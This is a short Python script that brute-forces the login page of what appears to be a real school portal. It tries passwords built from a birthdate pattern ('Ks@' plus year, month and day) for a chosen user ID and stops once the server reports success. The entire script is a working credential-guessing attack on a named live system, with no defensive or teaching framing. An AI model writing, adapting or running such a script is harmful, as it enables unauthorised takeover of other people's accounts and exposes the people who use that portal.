#[{"strStatus":"{ok}","strMessage":"登入成功！","ToURL":"/DSAI/Home"}]
import requests
import json
def f():
    q_id = input("Querying: ")
    min_year = int(input("Min year: "))
    max_year = int(input("Max year: "))
    url = "http://portal.kcistz.org.cn/DSAI/Account/LogInCheck"
    headers = {"Accept-Language" : "en-US,en;q=0.9"}
    for yrs in range(min_year,max_year+1):
        for mth in range(1,13):
            for days in range(1,32):
                password = "Ks@" + str(yrs) + str(mth).zfill(2) + str(days).zfill(2)
                print("Current attempt: " + password)
                d = {"UserID" : q_id, "Password" : password, "returnUrl" : ""}    
                r = requests.post(url, data=d, headers=headers)
                dic = json.loads(r.text)
                if dic[0]["strStatus"] == "{ok}":
                    print("successfully finished")
                    return
f()